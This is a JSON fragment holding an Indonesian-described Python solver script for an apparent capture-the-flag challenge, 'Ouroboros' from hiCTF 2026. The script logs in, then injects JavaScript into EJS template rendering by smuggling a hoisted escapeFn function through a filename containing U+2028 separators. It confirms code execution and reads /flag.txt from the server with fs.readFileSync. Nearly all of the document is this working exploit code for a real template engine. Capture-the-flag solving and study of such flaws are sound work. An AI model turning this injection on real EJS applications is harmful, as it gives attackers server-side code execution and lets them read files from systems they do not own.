        "title": "Automated Solver Script (solve.py)",
        "content": "Implementasi solver mandiri untuk menyelesaikan challenge secara deterministik. Jalankan dengan `python3 solve.py`.",
        "code": "#!/usr/bin/env python3\n\"\"\"Ouroboros (hiCTF 2026): EJS filename/sourceURL injection.\n\nUsage:\n    python3 solve.py https://<instance-host>\n\nOnly uses the known challenge routes and the observed /flag.txt path.\n\"\"\"\n\nimport argparse\nimport re\nimport sys\n\nimport requests\n\nPROOF = \"OURO_PROOF_73192\"\nFLAG_PREFIX = \"OURO_FLAG_RESULT:\"\nFLAG_RE = re.compile(r\"hiCTF\\{[^}\\r\\n]+\\}\")\n\n\ndef make_filename(js: str) -> str:\n    # A literal newline inside the filename breaks the injected source.\n    # U+2028 terminates the sourceURL comment; a function declaration is hoisted.\n    if \"\\n\" in js or \"\\r\" in js or \"\\u2028\" in js or \"\\u2029\" in js:\n        raise ValueError(\"The injected JS must be a single line, without U+2028/U+2029\")\n    return \"report.ejs\\u2028\" + js + \"\\u2028//\"\n\n\ndef render(session: requests.Session, base: str, js: str, timeout: int) -> tuple[int, str]:\n    data = {\n        \"title\": \"TRIGGER\",\n        \"body\": \"CONTROL\",\n        \"filename\": make_filename(js),\n        \"delimiter\": \"%\",\n        \"compileDebug\": True,\n        \"client\": True,\n    }\n    response = session.post(\n        base + \"/api/report/preview\", json={\"data\": data}, timeout=timeout\n    )\n    try:\n        parsed = response.json()\n        detail = parsed.get(\"detail\", response.text) if isinstance(parsed, dict) else response.text\n    except ValueError:\n        detail = response.text\n    return response.status_code, detail\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"Ouroboros EJS sourceURL exploit\")\n    ap.add_argument(\"base\", help=\"The challenge instance URL, including https://\")\n    ap.add_argument(\"--username\", default=\"ctf-solver\")\n    ap.add_argument(\"--timeout\", type=int, default=15)\n    args = ap.parse_args()\n\n    base = args.base.rstrip(\"/\")\n    if not base.startswith((\"https://\", \"http://\")):\n        ap.error(\"base must start with https:// or http://\")\n\n    session = requests.Session()\n    login = session.post(\n        base + \"/api/login\",\n        data={\"username\": args.username},\n        timeout=args.timeout,\n        allow_redirects=True,\n    )\n    login.raise_for_status()\n    if \"sid\" not in session.cookies:\n        print(\"[-] Login did not return a sid cookie\", file=sys.stderr)\n        return 1\n    print(\"[+] Authenticated\")\n\n    proof_js = f\"function escapeFn(s){{throw Error('{PROOF}');}}\"\n    status, detail = render(session, base, proof_js, args.timeout)\n    if detail.strip() != PROOF:\n        print(f\"[-] Proof failed (HTTP {status}): {detail[:1000]}\", file=sys.stderr)\n        return 1\n    print(f\"[+] JavaScript execution confirmed (HTTP {status})\")\n\n    # Read only the flag path discovered in the actual CTF filesystem listing.\n    read_js = (\n        \"function escapeFn(s){\"\n        \"const p=process;\"\n        \"const fs=typeof p.getBuiltinModule==='function'\"\n        \"?p.getBuiltinModule('fs'):p.mainModule.require('fs');\"\n        \"throw Error('OURO_FLAG_RESULT:'+fs.readFileSync('/flag.txt','utf8'));\"\n        \"}\"\n    )\n    status, detail = render(session, base, read_js, args.timeout)\n    if FLAG_PREFIX not in detail:\n        print(f\"[-] File-read failed (HTTP {status}): {detail[:1500]}\", file=sys.stderr)\n        return 1\n\n    match = FLAG_RE.search(detail.split(FLAG_PREFIX, 1)[1])\n    if not match:\n        print(f\"[-] No hiCTF flag found (HTTP {status}): {detail[:1500]}\", file=sys.stderr)\n        return 1\n\n    print(f\"<FLAG>{match.group(0)}</FLAG>\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())"
